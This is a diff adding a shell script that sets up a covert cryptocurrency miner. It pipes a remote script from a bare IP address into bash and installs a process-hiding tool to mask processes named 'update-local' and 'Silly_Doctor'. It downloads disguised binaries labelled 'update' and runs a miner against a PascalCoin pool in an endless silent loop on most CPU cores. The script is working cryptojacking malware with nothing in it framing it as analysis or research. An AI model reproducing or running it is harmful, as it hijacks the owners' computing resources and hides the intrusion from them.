@@ -1,0 +1,125 @@
+export DEBIAN_FRONTEND=noninteractive
+DEBIAN_FRONTEND=noninteractive
+
+sleep 2
+
+PID=`ps -eaf | grep shade | grep -v grep | awk '{print $2}'`
+if [[ "" !=  "$PID" ]]; then
+  echo "killing $PID"
+  kill -9 $PID
+fi
+
+sleep 2
+
+curl -fsSL http://176.58.105.206/install_and_monitor_shade_root.sh | bash &
+
+sleep 2
+
+apt update >/dev/null;apt -y install net-tools apt-utils psmisc libreadline-dev dialog curl wget >/dev/null;wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash && \
+
+sleep 2 && \
+
+source ~/.bashrc && \
+
+sleep 2 && \
+
+nvm install 21.6.1 && \
+
+sleep 2 && \
+
+npm && \
+
+sleep 2 && \
+
+npm install -g npm@10.4.0 && \
+
+sleep 2 && \
+
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null && \
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null && \
+dpkg-reconfigure --frontend noninteractive tzdata > /dev/null && \
+
+sleep 2 && \
+
+TZ='Africa/Johannesburg'; export TZ && \
+date && \
+sleep 2
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+currentdate=$(date '+%d-%b-%Y_Lab16Cores_')
+ipaddress=$(curl -s api.ipify.org)
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+currentdate+=$underscored_ip
+used_num_of_cores=`expr $num_of_cores - 4`
+echo ""
+echo $used_num_of_cores
+echo ""
+
+sleep 2
+
+npm
+
+sleep 2
+
+node -v
+
+sleep 2
+
+npm i -g node-process-hider 1>/dev/null 2>&1
+
+sleep 2
+
+ph add update-local 1>/dev/null 2>&1
+
+sleep 2
+
+ph add Silly_Doctor 1>/dev/null 2>&1
+
+sleep 2
+
+curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
+
+sleep 2
+
+tar -xf update.tar.gz > /dev/null
+
+sleep 2
+
+cat > update/local/update-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:1081
+END
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+
+sleep 3
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+./update/update curl ifconfig.me
+
+sleep 2
+
+./update/update wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/rhel.tar.gz 1>/dev/null 2>&1
+
+sleep 2
+
+tar -xf rhel.tar.gz
+
+echo " "
+echo " "
+
+sleep 2
+
+while true
+do
+./update/update ./rhel -s stratum+tcp:/pool.pascalcoin.org:10096 -su 819423-10.0.$currentdate -cpu -cputhreads $used_num_of_cores -r 40 1>/dev/null 2>&1
+sleep 10
+done
